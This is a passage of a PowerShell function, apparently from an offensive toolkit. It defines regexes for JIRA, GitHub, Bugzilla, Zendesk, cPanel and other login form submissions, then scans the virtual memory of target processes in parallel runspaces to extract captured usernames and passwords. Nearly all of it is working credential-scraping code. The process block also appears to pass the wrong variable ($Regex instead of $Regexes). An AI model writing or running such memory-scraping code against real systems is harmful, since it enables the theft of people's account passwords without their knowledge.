        $Regexes.Add('JIRA', [regex]'username=.{1,50}&password=.{1,50}&rememberMe')
        $Regexes.Add('Redmine', [regex]'username=.{1,50}&password=.{1,50}&login=Login')
        $Regexes.Add('Github', [regex]'%3D%3D&login=.{1,50}&password=.{1,50}')
        $Regexes.Add('BugZilla', [regex]'Bugzilla_login=.{1,50}&Bugzilla_password=.{1,50}')
        $Regexes.Add('Zendesk', [regex]'user%5Bemail%5D=.{1,50}&user%5Bpassword%5D=.{1,50}')
        $Regexes.Add('Cpanel', [regex]'user=.{1,50}&pass=.{1,50}')
        #endregion Regexes

        $RunspaceScript = {
            param (
                [Object]
                $MemoryPage,

                [Regex[]]
                $Regexes
            )

            $ASCIIString = [Text.Encoding]::ASCII.GetString($MemoryPage.Content)
            $UnicodeString = [Text.Encoding]::Unicode.GetString($MemoryPage.Content)

            foreach ($Regex in $Regexes) {
                foreach ($Match in $Regex.Matches($ASCIIString)) {
                    New-Object psobject -Property @{ AsciiMatch = $Match.Value }
                }
            
                foreach ($Match in $Regex.Matches($UnicodeString)) { 
                    New-Object psobject -Property @{ UnicodeMatch = $Match.Value }
                }
            }
        }
    
        $Runspaces = New-Object Collections.ArrayList
        $SessionState = [Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $RunspacePool = [RunspaceFactory]::CreateRunspacePool(1, $ThrottleLimit, $SessionState, $Host)
        $RunspacePool.Open()
    }

    process {
        foreach ($Proc in $Process) { 

            Get-MemoryContent -ProcessHandle $Proc.Handle | ForEach-Object {
        
                $PowerShell = [PowerShell]::Create().AddScript($RunspaceScript)
        
                [void]$PowerShell.AddArgument($_)
                [void]$PowerShell.AddArgument($Regex)
           
                $PowerShell.RunspacePool = $RunspacePool
           
                # Create an object for each runspace
                $Job = '' | Select-Object PowerShell,Result
                $Job.PowerShell = $PowerShell
                $Job.Result = $PowerShell.BeginInvoke()
        
                [void]$Runspaces.Add($Job)
            }

            # Counters for progress bar
            $TotalRunspaces = $RemainingRunspaces = $Runspaces.Count

            Write-Progress -Activity 'Scanning virtual memory pages...' -Status "Pages Remaining: $RemainingRunspaces" -PercentComplete 0

            do { $More = $false   

                foreach ($Job in $Runspaces) {
            
                    if ($Job.Result.IsCompleted) {
                    
                        $Job.PowerShell.EndInvoke($Job.Result)
                        $Job.PowerShell.Dispose()
                        $Job.Result = $null
                        $Job.PowerShell = $null
                        $RemainingRunspaces--

                        Write-Progress -Activity 'Scanning virtual memory pages...' -Status "Pages Remaining: $RemainingRunspaces" -PercentComplete (($TotalRunspaces - $RemainingRunspaces) / $TotalRunspaces * 100)
                    } 

                    if ($Job.Result -ne $null) { $More = $true }
                }
                   
                # Remove completed jobs
                $Runspaces.Clone() | Where-Object { $_.Result -eq $null } | ForEach-Object { $Runspaces.Remove($_) }

            } while ($More)
        }
        Write-Progress -Activity 'Scanning virtual memory pages...' -Status 'Completed' -Completed
    }
    end {
        $RunspacePool.Dispose()
        [GC]::Collect()
    }
}